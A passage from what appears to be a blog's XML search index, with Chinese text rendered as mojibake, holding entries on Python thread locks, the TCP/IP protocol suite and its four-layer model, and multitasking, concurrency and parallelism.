</p><ul><li>ç¡®ä¿äº†æŸæ®µå…³é”®ä»£ç åªèƒ½ç”±ä¸€ä¸ªçº¿ç¨‹ä»å¤´åˆ°å°¾å®Œæ•´åœ°æ‰§è¡Œ</li><li><p>é”çš„åå¤„:</p></li><li><p>é˜»æ­¢äº†å¤šçº¿ç¨‹å¹¶å‘æ‰§è¡Œï¼ŒåŒ…å«é”çš„æŸæ®µä»£ç å®é™…ä¸Šåªèƒ½ä»¥å•çº¿ç¨‹æ¨¡å¼æ‰§è¡Œï¼Œæ•ˆç‡å°±å¤§å¤§åœ°ä¸‹é™äº†</p></li><li>ç”±äºå¯ä»¥å­˜åœ¨å¤šä¸ªé”ï¼Œä¸åŒçš„çº¿ç¨‹æŒæœ‰ä¸åŒçš„é”ï¼Œå¹¶è¯•å›¾è·å–å¯¹æ–¹æŒæœ‰çš„é”æ—¶ï¼Œå¯èƒ½ä¼šé€ æˆæ­»é”</li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¤šä»»åŠ¡ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>TCPIPåè®®</title>
      <link href="/2018/11/11/tcpip-xie-yi/"/>
      <url>/2018/11/11/tcpip-xie-yi/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯åè®®"><a href="#ä»€ä¹ˆæ˜¯åè®®" class="headerlink" title="ä»€ä¹ˆæ˜¯åè®®"></a>ä»€ä¹ˆæ˜¯åè®®</h2><p>å°±åƒè¯´ä¸åŒè¯­è¨€çš„äººä¹‹é—´æ²Ÿé€šä¸€æ ·,åªè¦æœ‰ä¸€ç§å¤§å®¶éƒ½éµå®ˆçš„åè®®å³å¯,æœ‰çš„äººä¼šè¯´ä¸­æ–‡,æœ‰çš„äººä¼šè¯´æ³•è¯­,æœ‰çš„äººä¼šè¯´ä¿„è¯­ä½†æ˜¯ä¸ºäº†è§£å†³äººä»¬ä¹‹é—´çš„æ²Ÿé€šéšœç¢,ç°åœ¨è§„å®šå›½é™…è¯­è¨€ä¸ºâ€è‹±è¯­â€,è¿™å°±æ˜¯ä¸€ä¸ª<strong>è§„å®š</strong>,è¿™ä¸ª<strong>è§„å®šå°±å«åè®®</strong>.</p><h2 id="è®¡ç®—æœºä¹‹é—´å¦‚ä½•æ²Ÿé€š"><a href="#è®¡ç®—æœºä¹‹é—´å¦‚ä½•æ²Ÿé€š" class="headerlink" title="è®¡ç®—æœºä¹‹é—´å¦‚ä½•æ²Ÿé€š"></a>è®¡ç®—æœºä¹‹é—´å¦‚ä½•æ²Ÿé€š</h2><p>å°±åƒè¯´ä¸åŒè¯­è¨€çš„äººæ²Ÿé€šä¸€æ ·ï¼Œåªè¦æœ‰ä¸€ç§å¤§å®¶éƒ½è®¤å¯éƒ½éµå®ˆçš„åè®®å³å¯ï¼Œé‚£ä¹ˆè¿™ä¸ªè®¡ç®—æœºéƒ½éµå®ˆçš„ç½‘ç»œé€šä¿¡åè®®å«åšTCP/IPåè®®</p><h2 id="TCP-IPåè®®-æ—"><a href="#TCP-IPåè®®-æ—" class="headerlink" title="TCP/IPåè®®(æ—)"></a>TCP/IPåè®®(æ—)</h2><p>ä¸ºäº†æŠŠå…¨ä¸–ç•Œçš„æ‰€æœ‰ä¸åŒç±»å‹çš„è®¡ç®—æœºéƒ½è¿æ¥èµ·æ¥ï¼Œå°±å¿…é¡»è§„å®šä¸€å¥—å…¨çƒé€šç”¨çš„åè®®ï¼Œä¸ºäº†å®ç°äº’è”ç½‘è¿™ä¸ªç›®æ ‡ï¼Œäº’è”ç½‘åè®®æ—ï¼ˆInternet Protocol Suiteï¼‰å°±æ˜¯é€šç”¨åè®®æ ‡å‡†ã€‚</p><p>å› ä¸ºäº’è”ç½‘åè®®åŒ…å«äº†ä¸Šç™¾ç§åè®®æ ‡å‡†ï¼Œä½†æ˜¯æœ€é‡è¦çš„ä¸¤ä¸ªåè®®æ˜¯TCPå’ŒIPåè®®ï¼Œæ‰€ä»¥ï¼Œå¤§å®¶æŠŠ<strong>äº’è”ç½‘çš„åè®®</strong>ç®€ç§°<strong>TCP/IPåè®®(æ—)</strong></p><p><strong>TCP/IPåè®®(æ—)</strong>æ˜¯äº’è”ç½‘åè®®å¥—ä»¶ä¸­çš„ä¸¤ä¸ªä¸»è¦åè®®,æä¾›ç‰¹å®šåŠŸèƒ½ã€‚</p><blockquote><p><strong>TCPå®šä¹‰äº†åº”ç”¨ç¨‹åºå¦‚ä½•åœ¨ç½‘ç»œä¸Šåˆ›å»ºé€šä¿¡é€šé“</strong>ã€‚å®ƒè¿˜<strong>ç®¡ç†æ¶ˆæ¯</strong>å¦‚ä½•ç»„åˆæˆè¾ƒå°çš„æ•°æ®åŒ…ï¼Œç„¶åé€šè¿‡<strong>äº’è”ç½‘ä¼ è¾“å¹¶åœ¨ç›®çš„åœ°å€ä»¥æ­£ç¡®çš„é¡ºåºé‡æ–°ç»„è£…</strong>ã€‚</p></blockquote><blockquote><p>IPå®šä¹‰äº†å¦‚ä½•<strong>å¯»å€å’Œè·¯ç”±æ¯ä¸ªæ•°æ®åŒ…ä»¥ç¡®ä¿å®ƒåˆ°è¾¾æ­£ç¡®çš„ç›®çš„åœ°</strong>ã€‚ç½‘ç»œä¸Šçš„æ¯å°ç½‘å…³è®¡ç®—æœºéƒ½ä¼šæ£€æŸ¥æ­¤IPåœ°å€ï¼Œä»¥ç¡®å®šè½¬å‘é‚®ä»¶çš„ä½ç½®ã€‚</p></blockquote><h2 id="TCP-IPæ¨¡å‹"><a href="#TCP-IPæ¨¡å‹" class="headerlink" title="TCP / IPæ¨¡å‹"></a>TCP / IPæ¨¡å‹</h2><p>TCP / IPåŠŸèƒ½åˆ†ä¸ºå››å±‚ï¼Œæ¯å±‚åŒ…æ‹¬ç‰¹å®šåè®®ã€‚</p><ul><li>åº”ç”¨å±‚ä¸ºåº”ç”¨ç¨‹åºæä¾›æ ‡å‡†åŒ–æ•°æ®äº¤æ¢ã€‚å…¶åè®®åŒ…æ‹¬è¶…æ–‡æœ¬ä¼ è¾“â€‹â€‹åè®®ï¼ˆHTTPï¼‰ï¼Œæ–‡ä»¶ä¼ è¾“åè®®ï¼ˆFTPï¼‰ï¼Œé‚®å±€åè®®3ï¼ˆPOP3ï¼‰ï¼Œç®€å•é‚®ä»¶ä¼ è¾“åè®®ï¼ˆSMTPï¼‰å’Œç®€å•ç½‘ç»œç®¡ç†åè®®ï¼ˆSNMPï¼‰ã€‚</li><li>ä¼ è¾“å±‚è´Ÿè´£ç»´æŠ¤æ•´ä¸ªç½‘ç»œçš„ç«¯åˆ°ç«¯é€šä¿¡ã€‚TCPå¤„ç†ä¸»æœºä¹‹é—´çš„é€šä¿¡ï¼Œå¹¶æä¾›æµé‡æ§åˆ¶ï¼Œå¤šè·¯å¤ç”¨å’Œå¯é æ€§ã€‚ä¼ è¾“åè®®åŒ…æ‹¬TCPå’Œç”¨æˆ·æ•°æ®æŠ¥åè®®ï¼ˆUDPï¼‰ï¼Œæœ‰æ—¶ä¸ºäº†ç‰¹æ®Šç›®çš„è€Œä½¿ç”¨TCPè€Œä¸æ˜¯TCPã€‚</li><li>ç½‘ç»œå±‚ï¼ˆä¹Ÿç§°ä¸ºäº’è”ç½‘å±‚ï¼‰å¤„ç†åˆ†ç»„å¹¶è¿æ¥ç‹¬ç«‹ç½‘ç»œä»¥è·¨ç½‘ç»œè¾¹ç•Œä¼ è¾“åˆ†ç»„ã€‚ç½‘ç»œå±‚åè®®æ˜¯IPå’ŒInternetæ§åˆ¶æ¶ˆæ¯åè®®ï¼ˆICMPï¼‰ï¼Œç”¨äºé”™è¯¯æŠ¥å‘Šã€‚</li><li>ç‰©ç†å±‚ç”±ä»…åœ¨é“¾è·¯ä¸Šè¿è¡Œçš„åè®®ç»„æˆ - é“¾è·¯æ˜¯è¿æ¥ç½‘ç»œä¸­èŠ‚ç‚¹æˆ–ä¸»æœºçš„ç½‘ç»œç»„ä»¶ã€‚è¯¥å±‚ä¸­çš„åè®®åŒ…æ‹¬ç”¨äºå±€åŸŸç½‘ï¼ˆLANï¼‰çš„ä»¥å¤ªç½‘å’Œåœ°å€è§£æåè®®ï¼ˆARPï¼‰ã€‚</li></ul><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/uXcqw6kMBVvAFTQzTJ3jf.ICUmFd0lCGl2CX.daXvEQ!/b/dFQBAAAAAAAA&amp;bo=bAKpAQAAAAADF*Q!&amp;rf=viewer_4" alt="åè®®æ ‡å‡†"></p><p>OSIä¸ƒå±‚æ¨¡å‹åªæ˜¯ç†è®º,åœ¨ç°å®è¿‡ç¨‹å½“ä¸­ç”¨çš„æœ€å¤šçš„è¿˜æ˜¯4å±‚æ¨¡å‹<br>å¸¸ç”¨çš„ç½‘ç»œåè®®ä»¥åŠå…³ç³»å›¾<br>å¸¸ç”¨çš„ç½‘ç»œåè®®åŒ…æ‹¬:</p><blockquote><p>TCP,UDP,ICMP,IGMP,ARP,RARP</p></blockquote><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/YtH*4mHdOGGUARth*V8YNiSDioIMkrjOQ27.40nl1PQ!/b/dLYAAAAAAAAA&amp;bo=TwKzAQAAAAADF80!&amp;rf=viewer_4" alt="å¸¸ç”¨çš„ç½‘ç»œåè®®"></p><h2 id="å¦‚ä½•ä¼ è¾“"><a href="#å¦‚ä½•ä¼ è¾“" class="headerlink" title="å¦‚ä½•ä¼ è¾“"></a>å¦‚ä½•ä¼ è¾“</h2><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/4boEMl8Ez8CB4JJPi4wSy1IDNrCWjq1Y8IoJqo2f780!/b/dFIBAAAAAAAA&amp;bo=vAPnAgAAAAADF2g!&amp;rf=viewer_4" alt="TCP/ipå¦‚ä½•ä¼ è¾“"></p><h2 id="TCP-IPçš„ä¼˜ç‚¹"><a href="#TCP-IPçš„ä¼˜ç‚¹" class="headerlink" title="TCP / IPçš„ä¼˜ç‚¹"></a>TCP / IPçš„ä¼˜ç‚¹</h2><p>TCP / IPå…·æœ‰é«˜åº¦å¯æ‰©å±•æ€§ï¼Œå¹¶ä¸”ä½œä¸ºå¯è·¯ç”±åè®®ï¼Œå¯ä»¥ç¡®å®šé€šè¿‡ç½‘ç»œçš„æœ€æœ‰æ•ˆè·¯å¾„</p>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œé€šä¿¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TCP </tag>
            
            <tag> IP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>å¤šä»»åŠ¡çš„æ¦‚å¿µ</title>
      <link href="/2018/11/11/duo-ren-wu-de-gai-nian/"/>
      <url>/2018/11/11/duo-ren-wu-de-gai-nian/</url>
      
        <content type="html"><![CDATA[<p><img src="http://phmes812n.bkt.clouddn.com/%E5%A4%9A%E4%BB%BB%E5%8A%A1.png" alt="å¤šä»»åŠ¡"></p><p>æœ‰å¾ˆå¤šçš„åœºæ™¯ä¸­çš„äº‹æƒ…æ˜¯åŒæ—¶è¿›è¡Œçš„ï¼Œæ¯”å¦‚å¼€è½¦çš„æ—¶å€™ æ‰‹å’Œè„šå…±åŒæ¥é©¾é©¶æ±½è½¦ï¼Œå†æ¯”å¦‚å”±æ­Œè·³èˆä¹Ÿæ˜¯åŒæ—¶è¿›è¡Œçš„ï¼›</p><p>ä»€ä¹ˆå«â€œ<strong>å¤šä»»åŠ¡</strong>â€å‘¢ï¼Ÿç®€å•åœ°è¯´ï¼Œå°±æ˜¯<strong>æ“ä½œç³»ç»Ÿ</strong>å¯ä»¥<strong>åŒæ—¶</strong>è¿è¡Œå¤šä¸ªä»»åŠ¡ã€‚æ‰“ä¸ªæ¯”æ–¹ï¼Œ<strong>ä½ ä¸€è¾¹åœ¨ç”¨æµè§ˆå™¨ä¸Šç½‘ï¼Œä¸€è¾¹åœ¨å¬MP3</strong>ï¼Œä¸€è¾¹åœ¨ç”¨Wordèµ¶ä½œä¸šï¼Œè¿™å°±æ˜¯å¤šä»»åŠ¡ï¼Œè‡³å°‘åŒæ—¶æœ‰3ä¸ªä»»åŠ¡æ­£åœ¨è¿è¡Œã€‚è¿˜æœ‰å¾ˆå¤šä»»åŠ¡æ‚„æ‚„åœ°åœ¨åå°åŒæ—¶è¿è¡Œç€ï¼Œåªæ˜¯æ¡Œé¢ä¸Šæ²¡æœ‰æ˜¾ç¤ºè€Œå·²ã€‚</p><p><strong>å¹¶å‘</strong>ï¼šæŒ‡çš„æ˜¯<strong>ä»»åŠ¡æ•°å¤šä½™cpuæ ¸æ•°</strong>ï¼Œé€šè¿‡æ“ä½œç³»ç»Ÿçš„å„ç§ä»»åŠ¡è°ƒåº¦ç®—æ³•ï¼Œå®ç°ç”¨å¤šä¸ªä»»åŠ¡â€œä¸€èµ·â€æ‰§è¡Œï¼ˆå®é™…ä¸Šæ€»æœ‰ä¸€äº›ä»»åŠ¡ä¸åœ¨æ‰§è¡Œï¼Œå› ä¸ºåˆ‡æ¢ä»»åŠ¡çš„é€Ÿåº¦ç›¸å½“å¿«ï¼Œçœ‹ä¸Šå»ä¸€èµ·æ‰§è¡Œè€Œå·²ï¼‰</p><p><strong>å¹¶è¡Œ</strong>ï¼šæŒ‡çš„æ˜¯<strong>ä»»åŠ¡æ•°å°äºç­‰äºcpuæ ¸æ•°</strong>ï¼Œå³ä»»åŠ¡çœŸçš„æ˜¯ä¸€èµ·æ‰§è¡Œçš„</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¤šä»»åŠ¡ </tag>
            
            <tag> Thread </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
